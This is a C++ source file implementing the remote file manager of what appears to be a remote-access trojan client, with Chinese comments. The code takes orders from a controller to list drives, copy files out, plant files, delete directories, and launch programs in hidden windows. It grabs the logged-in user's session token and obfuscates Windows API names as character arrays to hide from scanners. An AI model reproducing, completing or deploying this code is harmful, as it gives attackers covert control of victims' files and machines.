// FileManager.cpp: implementation of the CFileManager class.
//
//////////////////////////////////////////////////////////////////////
//#include "StdAfx.h"
#include "FileManager.h"
#include <LM.h>
#include <ShlObj.h>
#include <shellapi.h>
#include <Windows.h>
typedef struct 
{
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
}FILESIZE;

enum
{
	COMMAND_COMPRESS_FILE_PARAM,
};

extern FARPROC MyGetProcAddressA(LPCSTR lpFileName, LPCSTR lpProcName);
  bool OpenFile1(LPCTSTR lpFile, BOOL bRunInAcsiUser, INT nShowCmd);

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CFileManager::CFileManager(CClientSocket *pClient):CManager(pClient)
{	HINSTANCE kernel32 = LoadLibrary("kernel32.dll"); 

typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL); 
LPFN_ISWOW64PROCESS fnIsWow64Process; 
fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress( kernel32,"IsWow64Process"); 

	m_bIsWow64 = FALSE;
	fnIsWow64Process(GetCurrentProcess(), &m_bIsWow64);
	m_hFileSend = INVALID_HANDLE_VALUE;
	m_hFileRecv = INVALID_HANDLE_VALUE;
	m_nTransferMode = TRANSFER_MODE_NORMAL;
	// 发送驱动器列表, 开始进行文件管理，建立新线程
	SendDriveList();
}

CFileManager::~CFileManager()
{
	m_UploadList.clear();
	if (m_hFileSend != INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_hFileSend);
		m_hFileSend = INVALID_HANDLE_VALUE;
	}
	if (m_hFileRecv != INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_hFileRecv);
		m_hFileRecv = INVALID_HANDLE_VALUE;
	}
}


void CFileManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	PVOID OldValue = NULL;
	BOOL bRevert = FALSE;
	if (m_bIsWow64)
	{
		char AjrFx[]={'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
		char xTfkA[]={'W','o','w','6','4','D','i','s','a','b','l','e','W','o','w','6','4','F','s','R','e','d','i','r','e','c','t','i','o','n','\0'};
		typedef BOOL (WINAPI *Wow64DisableWow64FsRedirectionT)(PVOID *OldValue);
		Wow64DisableWow64FsRedirectionT pWow64DisableWow64FsRedirection=(Wow64DisableWow64FsRedirectionT)MyGetProcAddressA(AjrFx,xTfkA);
		if (pWow64DisableWow64FsRedirection)
			bRevert = pWow64DisableWow64FsRedirection(&OldValue);
	}
	
	switch (lpBuffer[0])
	{
	case COMMAND_LIST_FILES:			// 获取磁盘列表(文件列表)
		SendFilesList((char *)lpBuffer + 1);
		break;
	case COMMAND_DELETE_FILE:			// 被控端删除单个文件
		DeleteFile((char *)lpBuffer + 1);
		SendToken(TOKEN_DELETE_FINISH);
		break;
	case COMMAND_DELETE_DIRECTORY:		// 被控端删除整个文件夹
		DeleteDirectory((char *)lpBuffer + 1);
		SendToken(TOKEN_DELETE_FINISH);
		break;
	case COMMAND_DOWN_FILES:			// 上传文件, 对于控制端来说是下载文件, 控制端仅创建文件(空文件)
		UploadToRemote(lpBuffer + 1);
		break;
	case COMMAND_CONTINUE:				// 上传数据, 对于控制端来说是下载数据, 控制端将保存数据到之前创建的空文件
		SendFileData(lpBuffer + 1);
		break;
	case COMMAND_CREATE_FOLDER:			// 被控端创建一个空的文件夹
		CreateFolder(lpBuffer + 1);
		break;
	case COMMAND_RENAME_FILE:			// 被控端重命名文件夹(文件)
		Rename(lpBuffer + 1);
		break;
	case COMMAND_STOP:					// 此处特殊
		StopTransfer(*&lpBuffer[1]);
		break;
	case COMMAND_SET_TRANSFER_MODE:		// 下载文件(对于控制端来说是上传文件)时的传输模式, 包含覆盖继传跳过等
		SetTransferMode(lpBuffer + 1);
		break;
	case COMMAND_FILE_SIZE:				// 下载文件, 对于控制端来说是上传文件, 被控端仅创建文件(空文件)
		CreateLocalRecvFile(lpBuffer + 1);
		break;
	case COMMAND_FILE_DATA:				// 下载数据, 对于控制端来说是上传数据, 被控端将保存数据到之前创建的空文件
		WriteLocalRecvFile(lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_OPEN_FILE_SHOW:		// 被控端以可见方式打开指定的文件(目录)
		OpenFile1((char *)lpBuffer + 2, !*(lpBuffer + 1), SW_SHOW);
		//ShellExecute(NULL, "open", (char *)lpBuffer + 1, NULL, NULL, SW_SHOW);
		break;
	case COMMAND_OPEN_FILE_HIDE:		// 被控端以隐藏方式打开指定的文件(目录)
		OpenFile1((char *)lpBuffer + 2, !*(lpBuffer + 1), SW_HIDE);
		//ShellExecute(NULL, "open", (char *)lpBuffer + 1, NULL, NULL, SW_HIDE);
		break;
	case COMMAND_COMPRESS_FILE_PARAM:	// 被控端用(WinRAR)压缩或解压指定的文件(目录)
		ExeCompress(lpBuffer + 1);
		break;
	default:
		break;
	}
	
	if (bRevert)
	{
		char VjrFx[]={'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
		char xTfkV[]={'W','o','w','6','4','R','e','v','e','r','t','W','o','w','6','4','F','s','R','e','d','i','r','e','c','t','i','o','n','\0'};
		typedef BOOL (WINAPI *Wow64RevertWow64FsRedirectionT)(PVOID OldValue);
		Wow64RevertWow64FsRedirectionT pWow64RevertWow64FsRedirection=(Wow64RevertWow64FsRedirectionT)MyGetProcAddressA(VjrFx,xTfkV);
		if (pWow64RevertWow64FsRedirection)
			pWow64RevertWow64FsRedirection(OldValue);
	}
}

bool CFileManager::MakeSureDirectoryPathExists(LPCTSTR pszDirPath)
{
    LPTSTR p, pszDirCopy;
    DWORD dwAttributes;

    // Make a copy of the string for editing.
    __try
    {
        pszDirCopy = (LPTSTR)malloc(sizeof(TCHAR) * (lstrlen(pszDirPath) + 1));

        if(pszDirCopy == NULL)
            return FALSE;

        lstrcpy(pszDirCopy, pszDirPath);

        p = pszDirCopy;

        //  If the second character in the path is "\", then this is a UNC
        //  path, and we should skip forward until we reach the 2nd \ in the path.

        if((*p == TEXT('\\')) && (*(p+1) == TEXT('\\')))
        {
            p++;            // Skip over the first \ in the name.
            p++;            // Skip over the second \ in the name.

            //  Skip until we hit the first "\" (\\Server\).

            while(*p && *p != TEXT('\\'))
            {
                p = CharNext(p);
            }

            // Advance over it.

            if(*p)
            {
                p++;
            }

            //  Skip until we hit the second "\" (\\Server\Share\).

            while(*p && *p != TEXT('\\'))
            {
                p = CharNext(p);
            }

            // Advance over it also.

            if(*p)
            {
                p++;
            }

        }
        else if(*(p+1) == TEXT(':')) // Not a UNC.  See if it's <drive>:
        {
            p++;
            p++;

            // If it exists, skip over the root specifier

            if(*p && (*p == TEXT('\\')))
            {
                p++;
            }
        }

		while(*p)
        {
            if(*p == TEXT('\\'))
            {
                *p = TEXT('\0');
                dwAttributes = GetFileAttributes(pszDirCopy);

                // Nothing exists with this name.  Try to make the directory name and error if unable to.
                if(dwAttributes == 0xffffffff)
                {
                    if(!CreateDirectory(pszDirCopy, NULL))
                    {
                        if(GetLastError() != ERROR_ALREADY_EXISTS)
                        {
                            free(pszDirCopy);
                            return FALSE;
                        }
                    }
                }
                else
                {
                    if((dwAttributes & FILE_ATTRIBUTE_DIRECTORY) != FILE_ATTRIBUTE_DIRECTORY)
                    {
                        // Something exists with this name, but it's not a directory... Error
                        free(pszDirCopy);
                        return FALSE;
                    }
                }
 
                *p = TEXT('\\');
            }

            p = CharNext(p);
        }
    }
    __except(EXCEPTION_EXECUTE_HANDLER)
    {
        // SetLastError(GetExceptionCode());
        free(pszDirCopy);
        return FALSE;
    }

    free(pszDirCopy);
    return TRUE;
}

bool CFileManager::OpenFile(LPCTSTR lpFile, INT nShowCmd)
{
	char	lpSubKey[500];
	HKEY	hKey;
	char	strTemp[MAX_PATH];
	LONG	nSize = sizeof(strTemp);
	char	*lpstrCat = NULL;
	memset(strTemp, 0, sizeof(strTemp));
	
	char	*lpExt = strrchr(lpFile, '.');
	if (!lpExt)
		return false;
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpExt, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);
	memset(lpSubKey, 0, sizeof(lpSubKey));
	wsprintf(lpSubKey, "%s\\shell\\open\\command", strTemp);
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	memset(strTemp, 0, sizeof(strTemp));
	nSize = sizeof(strTemp);
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);
	char str175914[]={'\"','%','1','\0'};
	char str175947[]={'%','1','\0'};
	lpstrCat = strstr(strTemp, str175914);
	if (lpstrCat == NULL)
		lpstrCat = strstr(strTemp,str175947);
	
	if (lpstrCat == NULL)
	{
		lstrcat(strTemp, " ");
		lstrcat(strTemp, lpFile);
	}
	else
		lstrcpy(lpstrCat, lpFile);
	
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	char str142919[]={'W','i','n','S','t','a','0','\\','D','e','f','a','u','l','t','\0'};
	if (nShowCmd != SW_HIDE)
		si.lpDesktop = str142919; 
	
	return CreateProcess(NULL, strTemp, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
}

HANDLE CFileManager::ImpersonateLoggedOnUserWrapper()
{
	char iOagR[]={'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
	char wSuTs[]={'W','T','S','G','e','t','A','c','t','i','v','e','C','o','n','s','o','l','e','S','e','s','s','i','o','n','I','d','\0'};
	typedef DWORD (WINAPI *WTSGetActiveConsoleSessionIdT)(void);
	WTSGetActiveConsoleSessionIdT pWTSGetActiveConsoleSessionId=(WTSGetActiveConsoleSessionIdT)MyGetProcAddressA(iOagR,wSuTs);
	
	char oIksN[]={'W','T','S','A','P','I','3','2','.','d','l','l','\0'};
	char xAsDm[]={'W','T','S','Q','u','e','r','y','U','s','e','r','T','o','k','e','n','\0'};
	typedef BOOL (WINAPI *WTSQueryUserTokenT)(ULONG SessionId,PHANDLE phToken);
	WTSQueryUserTokenT pWTSQueryUserToken=(WTSQueryUserTokenT)MyGetProcAddressA(oIksN,xAsDm);
	
	char AjrFx[]={'A','D','V','A','P','I','3','2','.','d','l','l','\0'};
	char kbCfr[]={'I','m','p','e','r','s','o','n','a','t','e','L','o','g','g','e','d','O','n','U','s','e','r','\0'};
	typedef BOOL (WINAPI *ImpersonateLoggedOnUserT)(HANDLE hToken);
	ImpersonateLoggedOnUserT pImpersonateLoggedOnUser=(ImpersonateLoggedOnUserT)MyGetProcAddressA(AjrFx,kbCfr);
	
	HANDLE hToken = NULL;
	if (pWTSGetActiveConsoleSessionId && pWTSQueryUserToken && pImpersonateLoggedOnUser)
	{
		DWORD dwConsoleSessionId = pWTSGetActiveConsoleSessionId();
		if (pWTSQueryUserToken(dwConsoleSessionId, &hToken))
		{
//			if (pImpersonateLoggedOnUser(hToken))
				return hToken;
		}
	}
	return NULL;
}

UINT CFileManager::SendDriveList()
{
	char	DriveString[256];
	// 前一个字节为令牌，后面的52字节为驱动器跟相关属性
	BYTE	DriveList[2048];
	char	FileSystem[MAX_PATH];
	char	*pDrive = NULL;
	char	szUserName[UNLEN+1];
	DWORD	dwUserLen = UNLEN;
	DriveList[0] = TOKEN_DRIVE_LIST; // 驱动器列表
	GetLogicalDriveStrings(sizeof(DriveString), DriveString);
	pDrive = DriveString;
	
	unsigned __int64	HDAmount = 0;
	unsigned __int64	HDFreeSpace = 0;
	unsigned long		AmntMB = 0; // 总大小
	unsigned long		FreeMB = 0; // 剩余空间
	
	GetUserName(szUserName, &dwUserLen);
	if (stricmp(szUserName, "SYSTEM") == 0)
		DriveList[1] = TRUE;
	else
		DriveList[1] = FALSE;
	
	HANDLE hTokenAcsi = ImpersonateLoggedOnUserWrapper();
//	SHGetSpecialFolderPath(NULL, (char *)&DriveList[1], CSIDL_DESKTOPDIRECTORY, FALSE);
	SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, hTokenAcsi, SHGFP_TYPE_CURRENT, (char *)&DriveList[2]);
//	RevertToSelf();
	CloseHandle(hTokenAcsi);
	
	for (DWORD dwOffset = 1 + 1 + lstrlen((char *)&DriveList[2]) + 1; *pDrive != '\0'; pDrive += lstrlen(pDrive) + 1)
	{
		memset(FileSystem, 0, sizeof(FileSystem));
		// 得到文件系统信息及大小
		GetVolumeInformation(pDrive, NULL, 0, NULL, NULL, NULL, FileSystem, MAX_PATH);
		SHFILEINFO	sfi;
		SHGetFileInfo(pDrive, FILE_ATTRIBUTE_NORMAL, &sfi, sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
		
		int	nTypeNameLen = lstrlen(sfi.szTypeName) + 1;
		int	nFileSystemLen = lstrlen(FileSystem) + 1;
		
		// 计算磁盘大小
		if (pDrive[0] != 'A' && pDrive[0] != 'B' && GetDiskFreeSpaceEx(pDrive, (PULARGE_INTEGER)&HDFreeSpace, (PULARGE_INTEGER)&HDAmount, NULL))
		{	
			AmntMB = HDAmount / 1024 / 1024;
			FreeMB = HDFreeSpace / 1024 / 1024;
		}
		else
		{
			AmntMB = 0;
			FreeMB = 0;
		}
		// 开始赋值
		DriveList[dwOffset] = pDrive[0];
		DriveList[dwOffset + 1] = GetDriveType(pDrive);
		
		// 磁盘空间描述占去了8字节
		memcpy(DriveList + dwOffset + 2, &AmntMB, sizeof(unsigned long));
		memcpy(DriveList + dwOffset + 6, &FreeMB, sizeof(unsigned long));
		
		// 磁盘卷标名及磁盘类型
		memcpy(DriveList + dwOffset + 10, sfi.szTypeName, nTypeNameLen);
		memcpy(DriveList + dwOffset + 10 + nTypeNameLen, FileSystem, nFileSystemLen);
		
		dwOffset += 10 + nTypeNameLen + nFileSystemLen;
	}

	return Send((LPBYTE)DriveList, dwOffset);
}

UINT CFileManager::SendFilesList(LPCTSTR lpszDirectory)
{
	// 重置传输方式
	m_nTransferMode = TRANSFER_MODE_NORMAL;	

	UINT	nRet = 0;
	char	strPath[MAX_PATH];
	char	*lpszSlash = NULL;
	char	*pszFileName = NULL;
	LPBYTE	lpList = NULL;
	HANDLE	hFile;
	DWORD	dwOffset = 0; // 位移指针
	int		nLen = 0;
	DWORD	nBufferSize =  1024 * 10; // 先分配10K的缓冲区
	WIN32_FIND_DATA	FindFileData;
	
	if (lpszDirectory[lstrlen(lpszDirectory) - 1] != '\\')
		lpszSlash = "\\";
	else
		lpszSlash = "";
	char str18010[]={'%','s','%','s','*','.','*','\0'};
	wsprintf(strPath,str18010, lpszDirectory, lpszSlash);
	hFile = FindFirstFile(strPath, &FindFileData);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		BYTE bToken = TOKEN_FILE_LIST;
		return Send(&bToken, 1);
	}
	
	lpList = (BYTE *)LocalAlloc(LPTR, nBufferSize);
	*lpList = TOKEN_FILE_LIST;
	
	// 1 为数据包头部所占字节,最后赋值
	dwOffset = 1;
	/*
	文件属性	1
	文件名		strlen(filename) + 1 ('\0')
	文件大小	4
	*/
	do 
	{
		// 动态扩展缓冲区
		if (dwOffset > (nBufferSize - MAX_PATH * 2))
		{
			nBufferSize += MAX_PATH * 2;
			lpList = (BYTE *)LocalReAlloc(lpList, nBufferSize, LMEM_ZEROINIT|LMEM_MOVEABLE);
		}
		pszFileName = FindFileData.cFileName;
		if (strcmp(pszFileName, ".") == 0 || strcmp(pszFileName, "..") == 0)
			continue;
		// 文件属性 1 字节
		*(lpList + dwOffset) = FindFileData.dwFileAttributes &	FILE_ATTRIBUTE_DIRECTORY;
		dwOffset++;
		// 文件名 lstrlen(pszFileName) + 1 字节
		nLen = lstrlen(pszFileName);
		memcpy(lpList + dwOffset, pszFileName, nLen);
		dwOffset += nLen;
		*(lpList + dwOffset) = 0;
		dwOffset++;
		
		// 文件大小 8 字节
		memcpy(lpList + dwOffset, &FindFileData.nFileSizeHigh, sizeof(DWORD));
		memcpy(lpList + dwOffset + 4, &FindFileData.nFileSizeLow, sizeof(DWORD));
		dwOffset += 8;
		// 最后访问时间 8 字节
		memcpy(lpList + dwOffset, &FindFileData.ftLastWriteTime, sizeof(FILETIME));
		dwOffset += 8;
	} while(FindNextFile(hFile, &FindFileData));

	nRet = Send(lpList, dwOffset);

	LocalFree(lpList);
	FindClose(hFile);
	return nRet;
}

bool CFileManager::DeleteDirectory(LPCTSTR lpszDirectory)
{
	WIN32_FIND_DATA	wfd;
	char	lpszFilter[MAX_PATH];
	char	*lpszSlash = NULL;
	memset(lpszFilter, 0, sizeof(lpszFilter));
	
	if (lpszDirectory[lstrlen(lpszDirectory) - 1] != '\\')
		lpszSlash = "\\";
	else
		lpszSlash = "";
    char str18114[]={'%','s','%','s','*','.','*','\0'};
	wsprintf(lpszFilter,str18114, lpszDirectory, lpszSlash);
	
	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE) // 如果没有找到或查找失败
		return false;
	char str18046[]={'%','s','%','s','%','s','\0'};
	do
	{
		if (wfd.cFileName[0] != '.')
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				char strDirectory[MAX_PATH];
				wsprintf(strDirectory,str18046, lpszDirectory, lpszSlash, wfd.cFileName);
				DeleteDirectory(strDirectory);
			}
			else
			{
				char strFile[MAX_PATH];
				wsprintf(strFile,str18046, lpszDirectory, lpszSlash, wfd.cFileName);
				if (wfd.dwFileAttributes & FILE_ATTRIBUTE_READONLY)
					SetFileAttributes(strFile, FILE_ATTRIBUTE_NORMAL);
				DeleteFile(strFile);
			}
		}
	} while (FindNextFile(hFind, &wfd));
	
	FindClose(hFind); // 关闭查找句柄
	
	if(!RemoveDirectory(lpszDirectory))
	{
		return false;
	}
	return true;
}

UINT CFileManager::SendFileSize(LPCTSTR lpszFileName)
{
	UINT	nRet = 0;
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
	// 保存当前正在操作的文件名
	memset(m_strCurrentProcessFileName, 0, sizeof(m_strCurrentProcessFileName));
	strcpy(m_strCurrentProcessFileName, lpszFileName);
	
	if (m_hFileSend != INVALID_HANDLE_VALUE)
		CloseHandle(m_hFileSend);
	m_hFileSend = CreateFile(lpszFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (m_hFileSend == INVALID_HANDLE_VALUE)
		return FALSE;
	dwSizeLow =	GetFileSize(m_hFileSend, &dwSizeHigh);
	//CloseHandle(m_hFileSend); // 此处不要关闭, 以后还要用
	// 构造数据包，发送文件长度(1字节token, 8字节大小, 文件名称, '\0')
	int		nPacketSize = lstrlen(lpszFileName) + 10;
	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);
	memset(bPacket, 0, nPacketSize);
	
	bPacket[0] = TOKEN_FILE_SIZE;
	FILESIZE *pFileSize = (FILESIZE *)(bPacket + 1);
	pFileSize->dwSizeHigh = dwSizeHigh;
	pFileSize->dwSizeLow = dwSizeLow;
	memcpy(bPacket + 9, lpszFileName, lstrlen(lpszFileName) + 1);

	nRet = Send(bPacket, nPacketSize);
	LocalFree(bPacket);
	return nRet;
}

UINT CFileManager::SendFileData(LPBYTE lpBuffer)
{
	UINT		nRet;
	FILESIZE	*pFileSize;
	char		*lpFileName;

	pFileSize = (FILESIZE *)lpBuffer;
	lpFileName = m_strCurrentProcessFileName;

	// 远程跳过，传送下一个
	if (pFileSize->dwSizeHigh == -1 && pFileSize->dwSizeLow == -1)
	{
		UploadNext();
		return 0;
	}

	SetFilePointer(m_hFileSend, pFileSize->dwSizeLow, (long *)&(pFileSize->dwSizeHigh), FILE_BEGIN);

	int		nHeadLength = 9; // 1 + 4 + 4数据包头部大小
	DWORD	nNumberOfBytesToRead = MAX_SEND_BUFFER - nHeadLength;
	DWORD	nNumberOfBytesRead = 0;

	LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, MAX_SEND_BUFFER);
	// Token,  大小，偏移，文件名，数据
	lpPacket[0] = TOKEN_FILE_DATA;
	memcpy(lpPacket + 1, pFileSize, sizeof(FILESIZE));
	ReadFile(m_hFileSend, lpPacket + nHeadLength, nNumberOfBytesToRead, &nNumberOfBytesRead, NULL);
	//CloseHandle(m_hFileSend); // 此处不要关闭, 以后还要用

	if (nNumberOfBytesRead > 0)
	{
		int	nPacketSize = nNumberOfBytesRead + nHeadLength;
		nRet = Send(lpPacket, nPacketSize);
	}
	else
	{
		UploadNext();
	}

	LocalFree(lpPacket);

	return nRet;
}

// 传送下一个文件
void CFileManager::UploadNext()
{
	if (m_hFileSend != INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_hFileSend);
		m_hFileSend = INVALID_HANDLE_VALUE;
	}
	list <string>::iterator it = m_UploadList.begin();
	// 删除一个任务
	m_UploadList.erase(it);
	// 还有上传任务
	if(m_UploadList.empty())
	{
		SendToken(TOKEN_TRANSFER_FINISH);
	}
	else
	{
		// 上传下一个
		it = m_UploadList.begin();
		SendFileSize((*it).c_str());
	}
}

int CFileManager::SendToken(BYTE bToken)
{
	return Send(&bToken, 1);
}

bool CFileManager::UploadToRemote(LPBYTE lpBuffer)
{
	if (lpBuffer[lstrlen((char *)lpBuffer) - 1] == '\\')
	{
		FixedUploadList((char *)lpBuffer);
		if (m_UploadList.empty())
		{
			StopTransfer(TRUE);
			return true;
		}
	}
	else
	{
		m_UploadList.push_back((char *)lpBuffer);
	}

	list <string>::iterator it = m_UploadList.begin();
	// 发送第一个文件
	SendFileSize((*it).c_str());

	return true;
}

bool CFileManager::FixedUploadList(LPCTSTR lpPathName)
{
	WIN32_FIND_DATA	wfd;
	char	lpszFilter[MAX_PATH];
	char	*lpszSlash = NULL;
	memset(lpszFilter, 0, sizeof(lpszFilter));

	if (lpPathName[lstrlen(lpPathName) - 1] != '\\')
		lpszSlash = "\\";
	else
		lpszSlash = "";
    char str18114[]={'%','s','%','s','*','.','*','\0'};
	wsprintf(lpszFilter,str18114, lpPathName, lpszSlash);
	
	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE) // 如果没有找到或查找失败
		return false;
	char str18046[]={'%','s','%','s','%','s','\0'};
	do
	{
		if (wfd.cFileName[0] != '.')
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				char strDirectory[MAX_PATH];
				wsprintf(strDirectory,str18046, lpPathName, lpszSlash, wfd.cFileName);
				FixedUploadList(strDirectory);
			}
			else
			{
				char strFile[MAX_PATH];
				wsprintf(strFile,str18046, lpPathName, lpszSlash, wfd.cFileName);
				m_UploadList.push_back(strFile);
			}
		}
	} while (FindNextFile(hFind, &wfd));
	
	FindClose(hFind); // 关闭查找句柄
	return true;
}

void CFileManager::StopTransfer(BOOL bIsUpload)
{
	if (!m_UploadList.empty())
		m_UploadList.clear();
	if (m_hFileSend != INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_hFileSend);
		m_hFileSend = INVALID_HANDLE_VALUE;
	}
	if (m_hFileRecv != INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_hFileRecv);
		m_hFileRecv = INVALID_HANDLE_VALUE;
	}
	if (bIsUpload)
		SendToken(TOKEN_TRANSFER_FINISH);
}

void CFileManager::CreateLocalRecvFile(LPBYTE lpBuffer)
{
	FILESIZE	*pFileSize = (FILESIZE *)lpBuffer;
	// 保存当前正在操作的文件名
	memset(m_strCurrentProcessFileName, 0, sizeof(m_strCurrentProcessFileName));
	strcpy(m_strCurrentProcessFileName, (char *)lpBuffer + 8);
	
	// 保存文件长度
	m_nCurrentProcessFileLength = ((__int64)pFileSize->dwSizeHigh << 32) + pFileSize->dwSizeLow;
	
	// 创建多层目录
	MakeSureDirectoryPathExists(m_strCurrentProcessFileName);
	
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = FindFirstFile(m_strCurrentProcessFileName, &FindFileData);
	
	if (hFind != INVALID_HANDLE_VALUE
		&& m_nTransferMode != TRANSFER_MODE_OVERWRITE_ALL 
		&& m_nTransferMode != TRANSFER_MODE_ADDITION_ALL
		&& m_nTransferMode != TRANSFER_MODE_JUMP_ALL
		)
	{
		SendToken(TOKEN_GET_TRANSFER_MODE);
	}
	else
	{
		GetFileData();
	}
	FindClose(hFind);
}

void CFileManager::GetFileData()
{
	int	nTransferMode;
	switch (m_nTransferMode)
	{
	case TRANSFER_MODE_OVERWRITE_ALL:
		nTransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case TRANSFER_MODE_ADDITION_ALL:
		nTransferMode = TRANSFER_MODE_ADDITION;
		break;
	case TRANSFER_MODE_JUMP_ALL:
		nTransferMode = TRANSFER_MODE_JUMP;
		break;
	default:
		nTransferMode = m_nTransferMode;
	}
	
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = FindFirstFile(m_strCurrentProcessFileName, &FindFileData);
	
	//  1字节Token,四字节偏移高四位，四字节偏移低四位
	BYTE	bToken[9];
	DWORD	dwCreationDisposition; // 文件打开方式 
	memset(bToken, 0, sizeof(bToken));
	bToken[0] = TOKEN_DATA_CONTINUE;
	
	// 文件已经存在
	if (hFind != INVALID_HANDLE_VALUE)
	{
		// 提示点什么
		// 如果是续传
		if (nTransferMode == TRANSFER_MODE_ADDITION)
		{
			memcpy(bToken + 1, &FindFileData.nFileSizeHigh, 4);
			memcpy(bToken + 5, &FindFileData.nFileSizeLow, 4);
			dwCreationDisposition = OPEN_EXISTING;
		}
		// 覆盖
		else if (nTransferMode == TRANSFER_MODE_OVERWRITE)
		{
			// 偏移置0
			memset(bToken + 1, 0, 8);
			// 重新创建
			dwCreationDisposition = CREATE_ALWAYS;
			
		}
		// 传送下一个
		else if (nTransferMode == TRANSFER_MODE_JUMP)
		{
			DWORD dwOffset = -1;
			memcpy(bToken + 1, &dwOffset, 4);
			memcpy(bToken + 5, &dwOffset, 4);
			dwCreationDisposition = OPEN_EXISTING;
		}
	}
	else
	{
		// 偏移置0
		memset(bToken + 1, 0, 8);
		// 重新创建
		dwCreationDisposition = CREATE_ALWAYS;
	}
	FindClose(hFind);
	
	if (m_hFileRecv != INVALID_HANDLE_VALUE)
		CloseHandle(m_hFileRecv);
	m_hFileRecv = CreateFile(m_strCurrentProcessFileName,
		GENERIC_WRITE, 0, NULL, dwCreationDisposition, FILE_ATTRIBUTE_NORMAL, 0);
	// 需要错误处理
	if (m_hFileRecv == INVALID_HANDLE_VALUE)
	{
		m_nCurrentProcessFileLength = 0;
		return;
	}
	//CloseHandle(m_hFileRecv); // 此处不要关闭, 以后还要用

	Send(bToken, sizeof(bToken));
}

void CFileManager::WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize)
{
	// 传输完毕
	BYTE		*pData;
	DWORD		dwBytesToWrite;
	DWORD		dwBytesWrite;
	int			nHeadLength = 9; // 1 + 4 + 4  数据包头部大小，为固定的9
	FILESIZE	*pFileSize;
	
	// 得到数据的偏移
	pData = lpBuffer + 8;
	pFileSize = (FILESIZE *)lpBuffer;
	
	// 得到数据在文件中的偏移
	LONG	dwOffsetHigh = pFileSize->dwSizeHigh;
	LONG	dwOffsetLow = pFileSize->dwSizeLow;
	
	dwBytesToWrite = nSize - 8;
	
	SetFilePointer(m_hFileRecv, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);
	
	BOOL bRet = WriteFile(m_hFileRecv, pData, dwBytesToWrite, &dwBytesWrite, NULL);
// 	if (bRet == FALSE)
// 		printf("文件写入失败");
	dwOffsetLow = 0; dwOffsetHigh = 0;
	dwOffsetLow = SetFilePointer(m_hFileRecv, dwOffsetLow, &dwOffsetHigh, FILE_CURRENT);
	//CloseHandle(m_hFileRecv);  // 此处不要关闭, 以后还要用
	// 为了比较，计数器递增
	
	BYTE	bToken[9];
	bToken[0] = TOKEN_DATA_CONTINUE;
	memcpy(bToken + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
	memcpy(bToken + 5, &dwOffsetLow, sizeof(dwOffsetLow));
	Send(bToken, sizeof(bToken));
}

void CFileManager::SetTransferMode(LPBYTE lpBuffer)
{
	memcpy(&m_nTransferMode, lpBuffer, sizeof(m_nTransferMode));
	GetFileData();
}

void CFileManager::CreateFolder(LPBYTE lpBuffer)
{
	MakeSureDirectoryPathExists((char *)lpBuffer);
	SendToken(TOKEN_CREATEFOLDER_FINISH);
}

void CFileManager::Rename(LPBYTE lpBuffer)
{
	LPCTSTR lpExistingFileName = (char *)lpBuffer;
	LPCTSTR lpNewFileName = lpExistingFileName + lstrlen(lpExistingFileName) + 1;
	::MoveFile(lpExistingFileName, lpNewFileName);
	SendToken(TOKEN_RENAME_FINISH);
}

//压缩解或压缩文件
void CFileManager::ExeCompress(BYTE *lpBuffer)
{
	SHELLEXECUTEINFO ShExecInfo = {0};
	ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
	ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	ShExecInfo.lpVerb = NULL;
	ShExecInfo.lpFile = "WinRAR";
	ShExecInfo.lpParameters = (char*)lpBuffer;
	ShExecInfo.nShow = SW_HIDE;
	if (ShellExecuteEx(&ShExecInfo))
	{
		WaitForSingleObject(ShExecInfo.hProcess, INFINITE);
		CloseHandle(ShExecInfo.hProcess);
		SendToken(TOKEN_COMPRESS_FINISH);
	}
}
typedef DWORD
(WINAPI
 *GetFileAttributesAT)(
 __in LPCSTR lpFileName
 );
typedef HINSTANCE
(WINAPI
 *ShellExecuteAT)(
 HWND hwnd, 
 LPCSTR lpOperation, 
 LPCSTR lpFile, 
 LPCSTR lpParameters,
 LPCSTR lpDirectory, 
    INT nShowCmd);
